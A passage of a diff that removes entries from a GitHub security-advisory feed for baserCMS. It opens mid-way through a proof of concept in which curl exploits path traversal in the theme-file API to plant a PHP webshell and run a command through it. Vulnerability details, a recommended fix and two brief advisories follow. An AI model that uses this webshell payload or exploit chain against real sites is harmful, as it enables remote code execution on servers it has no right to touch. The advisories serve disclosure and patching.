-# 2. Create webshell
-curl -X POST "http://target/baser/api/admin/bc-theme-file/theme_files/add.json" \
-  -H "Authorization: Bearer &lt;token&gt;" \
-  -H "Content-Type: application/json" \
-  -d '{
-    "theme": "BcThemeSample",
-    "plugin": "",
-    "type": "layout",
-    "path": "../../../../webroot/",
-    "base_name": "shell",
-    "ext": "php",
-    "contents": "&lt;?php system($_GET[\"cmd\"]); ?&gt;"
-  }'
-
-# 3. RCE
-curl "http://target/shell.php?cmd=id"
-</code></pre>
-<h2 id="vulnerability-details">Vulnerability Details</h2>
-<table>
-<thead>
-<tr>
-<th>Item</th>
-<th>Details</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>CWE</td>
-<td>CWE-22: Path Traversal, CWE-73: External Control of File Name or Path</td>
-</tr>
-<tr>
-<td>Impact</td>
-<td>Arbitrary file write, Remote Code Execution (RCE)</td>
-</tr>
-<tr>
-<td>Attack Prerequisites</td>
-<td>Administrator privileges + API enabled (<code>USE_CORE_ADMIN_API=true</code>), or chaining with XSS, etc.</td>
-</tr>
-<tr>
-<td>Reproducibility</td>
-<td>High (PoC verified)</td>
-</tr>
-<tr>
-<td>Test Environment</td>
-<td>baserCMS 5.x (Docker environment)</td>
-</tr>
-</tbody></table>
-<h3 id="additional-notes-on-attack-prerequisites">Additional Notes on Attack Prerequisites</h3>
-<ul>
-<li><strong>When API is enabled</strong> (<code>USE_CORE_ADMIN_API=true</code>): API calls can be made externally using JWT token authentication. Direct exploitation is possible.</li>
-<li><strong>Default settings</strong> (<code>USE_CORE_ADMIN_API=false</code>): Direct external API calls are prohibited. CSRF protection is also active, so this vulnerability alone cannot be exploited. An exploit chain involving XSS or similar is required.</li>
-</ul>
-<h2 id="recommended-fix">Recommended Fix</h2>
-<p>Rather than relying on simple string replacement or blacklist checks of input, the canonicalized path (using <code>realpath()</code>, etc.) should be verified to be within the theme base directory after file creation or immediately before writing. If the path falls outside the boundary, the operation should be rejected.</p>
-<p>The specific implementation location and method are left to the project's design decisions.</p>
-<h2 id="comparison-with-other-cms">Comparison with Other CMS</h2>
-<p>WordPress's theme editor only allows editing within <code>wp-content/themes/</code> and does not permit writes outside that directory. <a href="https://www.sonarsource.com/blog/wordpress-image-remote-code-execution/">CVE-2019-8943</a> was reported as a path traversal vulnerability in <code>wp_crop_image()</code> that allowed writing cropped image output to an arbitrary directory by including <code>../</code> in the filename.</p>
-<p>This vulnerability is not a matter of "administrators being able to execute arbitrary code" by design, but rather stems from a security boundary violation where "the theme editing function can write outside the theme directory (to webroot, config, etc.)."</p>
-<h2 id="resources">Resources</h2>
-<ul>
-<li>OWASP Path Traversal: <a href="https://owasp.org/www-community/attacks/Path_Traversal">https://owasp.org/www-community/attacks/Path_Traversal</a></li>
-<li>WordPress RCE via Path Traversal (CVE-2019-8943): <a href="https://www.sonarsource.com/blog/wordpress-image-remote-code-execution/">https://www.sonarsource.com/blog/wordpress-image-remote-code-execution/</a></li>
-<li>Jira Path Traversal (CVE-2025-22167): <a href="https://nvd.nist.gov/vuln/detail/CVE-2025-22167">https://nvd.nist.gov/vuln/detail/CVE-2025-22167</a></li>
-</ul>
-<p>This advisory was translated from Japanese to English using GitHub Copilot.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/baserproject/basercms/security/advisories/GHSA-c5c6-37vq-pjcq">https://github.com/baserproject/basercms/security/advisories/GHSA-c5c6-37vq-pjcq</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-30940">https://nvd.nist.gov/vuln/detail/CVE-2026-30940</a></li>
-<li><a href="https://basercms.net/security/JVN_20837860">https://basercms.net/security/JVN_20837860</a></li>
-<li><a href="https://github.com/baserproject/basercms/releases/tag/5.2.3">https://github.com/baserproject/basercms/releases/tag/5.2.3</a></li>
-<li><a href="https://github.com/advisories/GHSA-c5c6-37vq-pjcq">https://github.com/advisories/GHSA-c5c6-37vq-pjcq</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-c5c6-37vq-pjcq</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-03-31T22:47:39.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[baserproject/basercms] baserCMS has OS command injection vulnerability in installer]]></title>
-        <id>https://github.com/advisories/GHSA-6hpg-8rx3-cwgv</id>
-        <link href="https://github.com/advisories/GHSA-6hpg-8rx3-cwgv"/>
-        <updated>2026-03-31T22:43:32.000Z</updated>
-        <content type="html"><![CDATA[<p>baserCMS has an OS command injection vulnerability in the installer.</p>
-<h3>Target</h3>
-<p>baserCMS 5.2.2 and earlier versions</p>
-<h3 id="vulnerability">Vulnerability</h3>
-<p>If baserCMS is placed on a server but not installed, malicious commands may be executed.</p>
-<h3 id="countermeasures">Countermeasures</h3>
-<p>Update to the latest version of baserCMS</p>
-<p>Please refer to the following page to reference for more information.
-<a href="https://basercms.net/security/JVN_54513170">https://basercms.net/security/JVN_54513170</a></p>
-<h3 id="credits">Credits</h3>
-<p>REN XINGDIAN</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/baserproject/basercms/security/advisories/GHSA-6hpg-8rx3-cwgv">https://github.com/baserproject/basercms/security/advisories/GHSA-6hpg-8rx3-cwgv</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-30880">https://nvd.nist.gov/vuln/detail/CVE-2026-30880</a></li>
-<li><a href="https://basercms.net/security/JVN_20837860">https://basercms.net/security/JVN_20837860</a></li>
-<li><a href="https://github.com/baserproject/basercms/releases/tag/5.2.3">https://github.com/baserproject/basercms/releases/tag/5.2.3</a></li>
-<li><a href="https://github.com/advisories/GHSA-6hpg-8rx3-cwgv">https://github.com/advisories/GHSA-6hpg-8rx3-cwgv</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-6hpg-8rx3-cwgv</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-03-31T22:43:31.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[baserproject/basercms] baserCMS has a cross-site scripting vulnerability in blog posts]]></title>
-        <id>https://github.com/advisories/GHSA-jmq3-x8q7-j9qm</id>
-        <link href="https://github.com/advisories/GHSA-jmq3-x8q7-j9qm"/>
-        <updated>2026-03-31T22:43:11.000Z</updated>
-        <content type="html"><![CDATA[<p>baserCMS has a cross-site scripting vulnerability in blog posts.</p>
-<h3>Target</h3>
-<p>baserCMS 5.2.1 and earlier versions</p>
-<h3 id="vulnerability">Vulnerability</h3>
-<p>Malicious Javascript may be executed in blog posts.</p>
-<h3 id="countermeasures">Countermeasures</h3>
-<p>Update to the latest version of baserCMS</p>
-<p>Please refer to the following page to reference for more information.
-<a href="https://basercms.net/security/JVN_20837860">https://basercms.net/security/JVN_20837860</a></p>
-<h3 id="credits">Credits</h3>
-<p>Gai Tanaka@Mitsui Bussan Secure Directions, Inc.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/baserproject/basercms/security/advisories/GHSA-jmq3-x8q7-j9qm">https://github.com/baserproject/basercms/security/advisories/GHSA-jmq3-x8q7-j9qm</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-30879">https://nvd.nist.gov/vuln/detail/CVE-2026-30879</a></li>
-<li><a href="https://basercms.net/security/JVN_20837860">https://basercms.net/security/JVN_20837860</a></li>
-<li><a href="https://github.com/baserproject/basercms/releases/tag/5.2.3">https://github.com/baserproject/basercms/releases/tag/5.2.3</a></li>
-<li><a href="https://github.com/advisories/GHSA-jmq3-x8q7-j9qm">https://github.com/advisories/GHSA-jmq3-x8q7-j9qm</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-jmq3-x8q7-j9qm</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-03-31T22:43:10.000Z</published>
     </entry>
 </feed>
